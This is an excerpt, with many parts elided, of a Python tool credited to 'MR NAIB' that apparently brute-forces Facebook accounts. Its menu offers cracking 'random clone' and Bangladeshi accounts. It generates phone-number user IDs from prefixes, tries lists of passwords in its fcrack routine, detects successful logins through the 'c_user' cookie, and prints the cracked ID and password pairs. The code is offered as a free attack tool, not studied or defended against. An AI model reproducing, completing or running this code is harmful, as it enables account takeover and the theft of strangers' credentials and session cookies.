...
##    ## ##     ## #### ########  pro🤞                                                                                                                  
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : MR NAIB
\033[97;1m>>     Facebook : MR NAIB 
\033[97;1m>>     Version  : 2.0.1
\033[97;1m>>     Github  : Mafyia313
\033[92;1m>>     Tool Type  : \x1b[91;1m Free
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> Tool  VERSION :\x1b[1;92m 2.0.1 ')
			print('>>>Tol Typ : \x1b[91;1m free')
			linex()
			print('\033[97;1m''[1] Crack Random Clone\n[2] Crack Bangladeshi account\n[3] Contact with Owner\n[0] Exit')
			linex()
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :92320,92318,92306.''\x1b[1;91mETC')
	linex()
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :92320,92318,92306.ETC')
	linex()
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mNAIB\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[NAIB-OK] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[NAIB-CP] '+uid+' | '+ps+'\33[0;97m')
